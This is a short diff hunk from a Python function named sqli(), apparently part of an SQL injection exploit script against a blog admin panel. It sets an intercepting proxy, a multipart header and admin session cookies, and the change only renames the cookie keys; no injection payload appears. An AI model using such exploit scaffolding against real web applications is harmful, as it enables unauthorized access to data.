@@ -10,7 +10,7 @@ def sqli():
     proxies= {"http":"http://127.0.0.1:8080",
             "https":"http://127.0.0.1:8080"}
     headers={"Content-Type": "multipart/form-data;boundary=---------------------------29609271438811050402597506081"}
-    cookies= {"BLOG_ADMIN":"ab203bf128a1eb9bz648dd569c3cf8a7", "columns%2Fblog%2Fblogadmin%2Fblogs_view.php":"{%22blogs-title%22:true%2C%22blogs-category%22:true%2C%22blogs-tags%22:true%2C%22blogs-content%22:true%2C%22blogs-photo%22:true%2C%22blogs-date%22:true%2C%22blogs-author%22:true%2C%22blogs-posted%22:true}"
+    cookies= {"TEST_ADMIN":"ab203bf128a1eb9bz648dd569c3cf8a7", "columns%2Fblog%2Ftestadmin%2Fblogs_view.php":"{%22blogs-title%22:true%2C%22blogs-category%22:true%2C%22blogs-tags%22:true%2C%22blogs-content%22:true%2C%22blogs-photo%22:true%2C%22blogs-date%22:true%2C%22blogs-author%22:true%2C%22blogs-posted%22:true}"
             }
     secret=""
     count=0
